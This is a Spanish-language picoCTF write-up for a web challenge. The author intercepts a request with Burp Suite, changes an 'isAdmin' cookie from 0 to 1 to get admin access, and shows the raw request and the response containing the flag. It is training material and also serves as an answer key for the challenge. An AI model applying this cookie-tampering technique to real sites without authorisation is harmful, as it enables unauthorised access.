
# Descripcion
Can you get the flag?Go to this [website](http://saturn.picoctf.net:51197/) and see what you can discover.

# Hints
- Do you know how to modify cookies?

# Solucion

Lo primero que hacemos es analizar la pagina, tenemos un boton para continuar como invitado. En este momento verifico si hay una cookie, pero en este momento no hay. Si le doy click en continuar como un invitado, genera una cookie con un valor de `isAdmin=0`el cual no puedo editar. 

Ahora intercepto la peticion del sitio web. Con burpsuite intercepto la peticion:

```
GET /check.php HTTP/1.1
Host: saturn.picoctf.net:51197
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://saturn.picoctf.net:51197/
Accept-Encoding: gzip, deflate, br
Cookie: isAdmin=0
Connection: keep-alive

```

Mando esto al `repeater` y modifico el valor de `isAdmin` a `1`, esto ya que 1 seria el equivalente a `True` y analizo la respuesta:

```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 03 Apr 2025 23:18:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Content-Length: 79





<html>
<body>



<p>picoCTF{gr4d3_A_c00k13_0d351e23}</p>


</body>
</html>

```

## Referencias
